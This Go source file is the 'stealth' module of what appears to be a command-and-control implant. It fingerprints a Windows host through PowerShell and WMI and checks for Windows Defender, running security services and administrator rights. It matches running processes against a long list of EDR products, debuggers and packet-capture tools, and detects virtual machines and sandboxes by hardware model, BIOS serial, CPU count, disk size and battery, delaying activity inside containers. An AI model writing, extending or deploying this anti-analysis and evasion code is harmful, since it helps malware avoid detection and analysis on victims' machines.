package stealth

import (
	"fmt"
	"os"
	"runtime"
	"strings"
	"time"

	"github.com/natx6/ananse/src/c2/implant/beacon"
	"github.com/natx6/ananse/src/c2/implant/shell"
)

var knownEDR = []string{
	"MsMpEng.exe", "Sense.exe", "MsSense.exe",
	"CrowdStrike", "CSFalcon", "csagent",
	"SentinelOne", "SentinelAgent",
	"CarbonBlack", "CB.exe",
	"Symantec", "SymCorp",
	"McAfee", "McPalm",
	"TrendMicro", "Tmcc",
	"Sophos", "SophosAgent",
	"BitDefender", "Bdagent",
	"Kaspersky", "Kav",
	"Cylance", "CyProtect",
	"PaloAlto", "Traps",
	"ESET", "ekrn",
	"Malwarebytes", "MBAM",
	"Cybereason", "CybereasonAgent",
	"WindowsDefender", "WinDefend",
	"wireshark", "tcpdump",
	"Procmon", "ProcessMonitor",
	"procexp", "ProcessExplorer",
	"dbgeng", "windbg",
	"OlllyDbg", "x64dbg",
	"ImmunityDebugger",
}

var knownSandbox = []string{
	"vmtoolsd", "VBoxService", "vboxtray",
	"xenservice", "xentools",
	"qemu-ga",
}

func phase1(p *beacon.TargetProfile) {
	p.OS = runtime.GOOS
	hostname, _ := os.Hostname()
	p.Hostname = hostname
	p.CPUArch = runtime.GOARCH

	out, _ := shell.Run("powershell -Command \"(Get-WmiObject Win32_OperatingSystem).Caption\"", 10e9)
	if out != "" {
		p.Platform = strings.TrimSpace(out)
	}
	out, _ = shell.Run("powershell -Command \"(Get-WmiObject Win32_OperatingSystem).Version\"", 10e9)
	if out != "" {
		p.PlatformVersion = strings.TrimSpace(out)
	}
	if p.Platform == "" {
		p.Platform = runtime.GOOS
	}

	out, _ = shell.Run("powershell -Command \"(Get-WmiObject Win32_OperatingSystem).TotalVisibleMemorySize\"", 10e9)
	if out != "" {
		var kb int64
		fmt.Sscanf(out, "%d", &kb)
		p.TotalMemory = kb * 1024
	}
	out, _ = shell.Run("powershell -Command \"(Get-WmiObject Win32_OperatingSystem).FreePhysicalMemory\"", 10e9)
	if out != "" {
		var kb int64
		fmt.Sscanf(out, "%d", &kb)
		p.FreeMemory = kb * 1024
	}

	p.Shell = "cmd.exe"

	out, _ = shell.Run("powershell -Command \"(Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory\" 2>$null", 5e9)
	_ = out

	envIndicators := []struct{ key, val, hint string }{
		{"CONTAINER", "", "container env"},
		{"KUBERNETES_SERVICE_HOST", "", "kubernetes"},
		{"DOCKER_HOST", "", "docker"},
		{"CI", "true", "ci environment"},
		{"JENKINS_HOME", "", "jenkins"},
	}
	for _, ind := range envIndicators {
		v := os.Getenv(ind.key)
		if ind.val != "" && v == ind.val {
			p.Hints = append(p.Hints, ind.hint)
		} else if ind.val == "" && v != "" {
			p.Hints = append(p.Hints, ind.hint)
		}
	}
}

func phase2(p *beacon.TargetProfile) {
	out, _ := shell.Run("powershell -Command \"Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring 2>$null\"", 10e9)
	if out != "" && strings.Contains(out, "False") {
		p.Hints = append(p.Hints, "windows defender active")
	}

	out, _ = shell.Run("powershell -Command \"Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object -ExpandProperty Name\"", 15e9)
	services := strings.ToLower(out)
	edrServices := []string{"windefend", "sense", "csfalcon", "sentinel", "cb"}
	for _, s := range edrServices {
		if strings.Contains(services, s) {
			p.HasAgent = true
			p.Hints = append(p.Hints, fmt.Sprintf("security service: %s", s))
		}
	}

	out, _ = shell.Run("netsh advfirewall show allprofiles state 2>nul", 5e9)
	if strings.Contains(out, "ON") || strings.Contains(out, "on") {
		p.Firewall = "windows firewall"
	} else {
		p.Firewall = "none"
	}

	adminCheck, _ := shell.Run("net session 2>nul", 5e9)
	if !strings.Contains(adminCheck, "Access is denied") {
		p.Hints = append(p.Hints, "running as administrator")
	}
}

func phase3(p *beacon.TargetProfile) {
	if ld := os.Getenv("LD_PRELOAD"); ld != "" {
		p.Hints = append(p.Hints, fmt.Sprintf("LD_PRELOAD=%s", ld))
	}

	out, _ := shell.Run("powershell -Command \"Get-Process | Select-Object -ExpandProperty ProcessName\"", 10e9)
	lower := strings.ToLower(out)
	for _, edr := range knownEDR {
		if strings.Contains(lower, strings.ToLower(edr)) {
			p.HasAgent = true
			p.Hints = append(p.Hints, fmt.Sprintf("EDR process: %s", edr))
		}
	}

	debugCheck, _ := shell.Run("powershell -Command \"[System.Diagnostics.Debugger]::IsAttached\"", 5e9)
	if strings.Contains(debugCheck, "True") {
		p.Hints = append(p.Hints, "debugger attached")
	}
}

// phase4 detects VM and sandbox environments on Windows.
func phase4(p *beacon.TargetProfile) {
	out, _ := shell.Run("powershell -Command \"(Get-WmiObject Win32_ComputerSystem).Model\"", 10e9)
	model := strings.ToLower(strings.TrimSpace(out))
	vmModels := map[string]string{
		"virtualbox":                              "VirtualBox",
		"vmware":                                  "VMware",
		"vmware virtual platform":                 "VMware",
		"kvm":                                     "KVM",
		"qemu":                                    "QEMU",
		"parallels":                               "Parallels",
		"xen":                                     "Xen",
		"microsoft corporation virtual machine":    "Hyper-V",
		"virtual machine":                         "",
	}
	for substr, vendor := range vmModels {
		if strings.Contains(model, substr) {
			p.IsVM = true
			if vendor != "" {
				p.VMVendor = vendor
			} else {
				p.VMVendor = "Unknown"
			}
			break
		}
	}

	out, _ = shell.Run("powershell -Command \"(Get-WmiObject Win32_BIOS).SerialNumber\"", 10e9)
	serial := strings.TrimSpace(out)
	if strings.Contains(strings.ToLower(serial), "vmware") || strings.Contains(strings.ToLower(serial), "virtual") {
		if !p.IsVM {
			p.IsVM = true
			p.VMVendor = "Unknown"
		}
	}

	out, _ = shell.Run("powershell -Command \"(Get-WmiObject Win32_ComputerSystem).NumberOfLogicalProcessors\"", 10e9)
	fmt.Sscanf(out, "%d", &p.CPUCount)
	if p.CPUCount < 2 {
		p.IsSandbox = true
		p.Hints = append(p.Hints, fmt.Sprintf("low cpu count: %d", p.CPUCount))
	}

	out, _ = shell.Run("powershell -Command \"(Get-WmiObject Win32_DiskDrive | Select-Object -First 1).Size\"", 10e9)
	var diskBytes int64
	fmt.Sscanf(out, "%d", &diskBytes)
	if diskBytes > 0 {
		p.DiskSizeGB = diskBytes / 1024 / 1024 / 1024
		if p.DiskSizeGB < 100 {
			p.Hints = append(p.Hints, fmt.Sprintf("small disk: %dGB", p.DiskSizeGB))
		}
	}

	out, _ = shell.Run("powershell -Command \"(Get-WmiObject Win32_Battery).EstimatedChargeRemaining\" 2>$null", 5e9)
	p.HasBattery = strings.TrimSpace(out) != ""
	if !p.HasBattery {
		p.Hints = append(p.Hints, "no battery detected")
	}
}

func QuickCheck() (threatLevel string, initialDelay time.Duration) {
	if os.Getenv("DOCKER_HOST") != "" || os.Getenv("KUBERNETES_SERVICE_HOST") != "" {
		return "medium", 90 * time.Second
	}
	return "low", 0
}
